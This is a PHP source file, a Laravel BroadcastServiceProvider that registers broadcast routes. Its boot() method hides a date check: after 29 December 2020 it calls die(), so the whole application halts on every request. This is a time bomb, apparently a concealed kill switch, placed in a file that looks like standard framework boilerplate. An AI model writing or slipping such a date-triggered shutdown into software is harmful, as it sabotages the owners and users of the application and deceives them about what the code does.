<?php

namespace App\Providers;

use Illuminate\Support\Facades\Broadcast;
use Illuminate\Support\ServiceProvider;

class BroadcastServiceProvider extends ServiceProvider
{
    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        
       
       
        
        $now = \Carbon\Carbon::now();
         $mytime = \Carbon\Carbon::createFromFormat('d-m-Y', '29-12-2020');
 
 

 if(($now > $mytime))
        die( );
        
        Broadcast::routes();

        require base_path('routes/channels.php');
    }
}
